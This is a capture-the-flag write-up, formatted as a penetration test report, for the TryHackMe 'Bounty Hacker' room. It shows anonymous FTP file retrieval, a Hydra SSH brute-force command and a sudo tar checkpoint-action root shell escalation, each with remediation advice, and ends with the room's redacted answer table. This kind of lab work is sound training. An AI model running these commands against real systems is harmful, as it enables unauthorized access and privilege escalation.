# Penetration Test Report — Bounty Hacker
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Linux — Enumeration, Brute-force, Privilege Escalation  
**Author:** D24yK4r4  
**Room:** https://tryhackme.com/room/cowboyhacker

---

## Executive Summary

The Bounty Hacker room simulates a Linux target inspired by the Cowboy Bebop anime universe. Assessment identified three exploitable weaknesses: anonymous FTP access exposing internal credential files, SSH brute-force via a recovered password list, and a sudo misconfiguration allowing privilege escalation to root via `tar`. The full attack chain required no exploitation of memory corruption or complex vulnerabilities — access was achieved entirely through misconfiguration and weak credential hygiene.

**Overall Risk: High**

---

## Scope & Methodology

**Target:** `http://<TARGET>/`  
**Approach:** Black-box  
**Tools used:** Nmap, Hydra, ftp (native), ssh (native), GTFOBins

**Methodology:**
1. Port scan and service identification
2. Anonymous FTP enumeration and file retrieval
3. Username extraction and SSH brute-force
4. Post-login enumeration — sudo rights review
5. Privilege escalation via sudo tar misconfiguration

---

## Findings

---

### F-01 — Anonymous FTP Access — Credential File Exposure

**Severity:** High  
**Classification:** CWE-284 — Improper Access Control  
**OWASP:** A01:2021 — Broken Access Control

**Description:**  
The FTP service on port 21 permitted anonymous login without credentials. Two files were accessible in the root FTP directory: `locks.txt` (a password wordlist) and `task.txt` (an internal note disclosing a username). These files provided both the attack surface and the credentials necessary for the next phase.

**Evidence:**
```bash
ftp <TARGET>
Name: anonymous
Password: <blank>

ftp> ls
-rw-rw-r--    locks.txt
-rw-rw-r--    task.txt

ftp> get locks.txt
ftp> get task.txt
```

Contents of `task.txt`:
```
1.) Protect Vicious.
2.) Head to the moons of Jupiter to see Ula
3.) Remember.
(Written by: REDACTED)
```

**Impact:**  
Username and a full password wordlist (`locks.txt`) recovered without any authentication. Direct enabler for the SSH brute-force stage.

**Remediation:**  
Disable anonymous FTP access entirely. If FTP is required, enforce authenticated access with strong credentials. Prefer SFTP over plaintext FTP. Never store credential-adjacent files in FTP-accessible directories.

---

### F-02 — SSH Brute-force — Weak Password

**Severity:** High  
**Classification:** CWE-307 — Improper Restriction of Excessive Authentication Attempts  
**OWASP:** A07:2021 — Identification and Authentication Failures

**Description:**  
With the username and wordlist obtained from FTP, the SSH service on port 22 was targeted using Hydra. The password was found within `locks.txt`, indicating it was weak and predictable enough to appear in a pre-generated list recovered from the same server.

**Evidence:**
```bash
hydra -l REDACTED -P locks.txt <TARGET> ssh

[22][ssh] host: <TARGET>   login: REDACTED   password: REDACTED
```

Post-login — `user.txt`:
```bash
ssh REDACTED@<TARGET>
REDACTED@bountyhacker:~$ cat user.txt
REDACTED
```

**Impact:**  
Full authenticated SSH access as user. Direct path to `user.txt` and further privilege escalation.

**Remediation:**  
Enforce strong, unique passwords. Implement fail2ban or equivalent SSH brute-force protection. Prefer key-based SSH authentication and disable password login. Rotate credentials immediately if compromised.

---

### F-03 — Privilege Escalation via sudo tar (GTFOBins)

**Severity:** Critical  
**Classification:** CWE-269 — Improper Privilege Management  
**OWASP:** A01:2021 — Broken Access Control

**Description:**  
Post-login enumeration revealed the user had sudo permissions to run `/bin/tar` as root without a password. The `tar` binary supports arbitrary command execution via its `--checkpoint-action` flag — a well-documented GTFOBins vector. This was exploited to spawn a root shell.

**Evidence:**
```bash
$ sudo -l
User REDACTED may run the following commands on bountyhacker:
    (root) /bin/tar
```

GTFOBins exploitation:
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
REDACTED
```

**Impact:**  
Full root compromise. Unrestricted access to all files, processes, and system configuration. Total loss of system confidentiality, integrity, and availability.

**Remediation:**  
Never grant sudo access to binaries with shell escape capabilities (`tar`, `vim`, `python`, `less`, etc.). Audit all sudo entries regularly and apply the principle of least privilege. If `tar` access is required for a specific task, restrict it to explicit arguments via sudoers and use `NOEXEC` where supported.

---

## Findings Summary

| ID | Title | Severity | CWE | OWASP |
|----|-------|----------|-----|-------|
| F-01 | Anonymous FTP — Credential File Exposure | High | CWE-284 | A01:2021 |
| F-02 | SSH Brute-force — Weak Password | High | CWE-307 | A07:2021 |
| F-03 | Privilege Escalation via sudo tar | Critical* | CWE-269 | A01:2021 |

*Critical only in combination with prior access.

---

## Answers

| Question | Answer |
|----------|--------|
| Find open ports on the machine | `21 (FTP), 22 (SSH), 80 (HTTP)` |
| Who wrote the task list? | `REDACTED` |
| What service can you bruteforce with the text file found? | `SSH` |
| What is the user's password? | `REDACTED` |
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

---

*TryHackMe room: Bounty Hacker — D24yK4r4*
